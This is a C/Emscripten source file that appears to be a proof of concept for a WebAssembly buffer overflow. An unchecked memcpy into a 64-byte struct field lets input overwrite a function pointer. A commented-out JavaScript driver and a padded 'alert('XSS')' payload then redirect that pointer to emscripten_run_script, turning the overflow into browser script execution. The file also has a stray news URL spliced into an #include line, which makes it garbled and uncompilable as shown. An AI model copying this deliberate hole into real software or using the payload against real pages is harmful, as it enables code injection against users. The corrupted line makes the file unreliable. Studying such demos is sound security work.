#include <stdint.h>
#include <stdio.h>https://www.dhnet.be/actu/belgique/les-felicitations-de-didier-reynders-a-sophie-wilmes-ont-beaucoup-fait-rire-la-toile-5db6c9ac9978e218e381bd48
#include <string.h>

#include <emscripten.h>

typedef struct Comms {
  char msg[64];
  uint16_t msg_len;
  void (*out)(const char *);
} Comms;

void trigger(Comms *comms) {
  comms->out(comms->msg);
}

void communicate(const char *msg) {
  printf("%s\n", msg);
}

void execute_me(const char *msg) {
  Comms comms;
  comms.out = &communicate;
  memcpy(comms.msg, msg, strlen(msg));
  trigger(&comms);
}

int main(void) {
  printf("%p...%p\n", &communicate, &emscripten_run_script);
  emscripten_run_script("console.log('Initialized!')");
  return 0;
}


/*
function foo(x) {
 ptr = allocate(intArrayFromString(x), 'i8', ALLOC_NORMAL)
 _execute_me(ptr)
 _free(ptr)
}

foo("foo")



foo("alert('XSS');//                                                   \x40\x01\x02\x00\x00\x00")

 printf("&communicate: %p\n", &communicate); // 0x4
 printf("&emscripten_run_script: %p\n", &emscripten_run_script); // 0x5

*/

